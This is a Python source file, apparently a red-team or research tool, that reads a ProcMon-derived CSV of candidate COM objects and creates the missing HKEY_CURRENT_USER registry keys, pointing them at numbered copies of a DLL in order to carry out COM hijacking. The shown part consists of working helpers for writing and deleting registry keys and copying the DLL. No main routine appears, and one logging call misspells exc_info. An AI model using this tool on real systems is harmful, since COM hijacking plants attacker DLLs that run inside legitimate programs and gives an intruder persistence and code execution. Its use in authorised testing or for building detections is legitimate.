'''
B"H
Author: Asher Davila
Description: This script takes a CSV file of potential COM hijacking objects (obtained by ProcMon dumps).
            Then, it creates those missing registries to attempt to hijack them.
'''

import csv
import logging
import pandas as pd
import re
import shutil
import winreg

from typing import Final
logging.getLogger().setLevel(logging.INFO)

BASE_DLL: Final[str] = r"C:\DLLs\COMDLL.dll"
BLANK: Final[str] = " "
DLL_DIRECTORY: Final[str] = "C:\\DLLs\\"

def extract_column(csv_file, column_index)->list:
    reader = pd.read_csv(csv_file, usecols=[column_index])
    extracted_values = reader['Path']
    extracted_values = extracted_values.str.replace('\w+(?=\\)', '', regex=True)
    extracted_values = extracted_values.drop_duplicates().tolist()
    return extracted_values

def create_registry_key(key_path, value_data)->None:
    try:
        # Create the registry.
        key = winreg.CreateKeyEx(
            winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        logging.info(f"Registry key {str(key_path)} opened successfully.")

        # Set the value of the registry key.
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, value_data)
        
        # Close the registry key.
        winreg.CloseKey(key)
        logging.info(f"Registry key created successfully.")
    except Exception as e:
        logging.error(
            f"Failed to create registry key: {str(e)}\n", exc_info=True)

def delete_registry_key(key_path)->None:
    try:
        # Open the registry key for deletion.
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)

        # Recursively delete all subkeys and values.
        winreg.DeleteKey(key, "")

        # Close the registry key.
        winreg.CloseKey(key)
        logging.info(f"Registry key {key_path} deleted successfully.")
    except FileNotFoundError:
        logging.warning(f"Registry key {key_path} does not exist.\n")
    except Exception as e:
        logging.error(f"Failed to delete registry key: {str(e)}\n", exec_info=True)

def remove_first_word_before_backslash(string_to_modify)->str:
    # Match the first word before a backslash
    pattern = r'\w+(?=\\)'
    # Replace the matched portion with an empty string
    result = re.sub(pattern, '', string_to_modify, count=1)
    return result.strip('\\')

def copy_DLL(index)->str:
    source_file = BASE_DLL
    destination_directory = DLL_DIRECTORY
    file_name = 'COMDLL_'
    extension = '.dll'

    # Find an available file name by incrementing the number
    destination_file = f"{destination_directory}{file_name}{index}{extension}"
    
    # Copy the file to the destination
    shutil.copy(source_file, destination_file)
    logging.info(f"File copied: {destination_file}\n")
    return destination_file